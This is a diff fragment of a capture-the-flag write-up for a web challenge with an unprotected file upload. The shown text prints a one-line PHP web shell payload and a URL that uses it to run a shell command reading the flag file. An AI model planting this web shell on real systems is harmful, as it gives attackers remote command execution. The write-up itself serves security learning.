@@ -43,6 +43,7 @@ Challenge: http://h4ck3r.quest:9010
 :::
 
 There's no any protection. Therefore, upload `webshell` and get shell
+
 ## Exploit - `webshell`
 Payload: `<?php system($_GET["sh"]); ?>`
 `view-source:http://h4ck3r.quest:9010/images/09956fc7c4f424b0_simple.php?sh=cat%20../../../../flag`
